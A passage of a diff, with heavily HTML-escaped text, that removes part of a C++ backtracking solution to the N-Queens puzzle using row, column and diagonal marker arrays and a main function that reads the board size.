-    if(!row[x] &amp;amp;&amp;amp; !col[y] &amp;amp;&amp;amp; !dg[x + y] &amp;amp;&amp;amp; !udg[x - y + n])&amp;#123;
-        g[x][y] = &#39;Q&#39;;
-        row[x] = col[y] = dg[x + y] = udg[x - y + n] = true;
-        dfs(x, y + 1, s + 1);
-        row[x] = col[y] = dg[x + y] = udg[x - y + n] = false;
-        g[x][y] = &#39;.&#39;;
-    &amp;#125;
-&amp;#125;
-
-int main()&amp;#123;
-    cin &amp;gt;&amp;gt; n;
-    for(int i = 0; i &amp;lt; n; i++)
-        for(int j = 0; j &amp;lt; n; j ++)
-            g[i][j] = &#39;.&#39;;
-            
-    dfs(0, 0, 0);
-    
     return 0;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
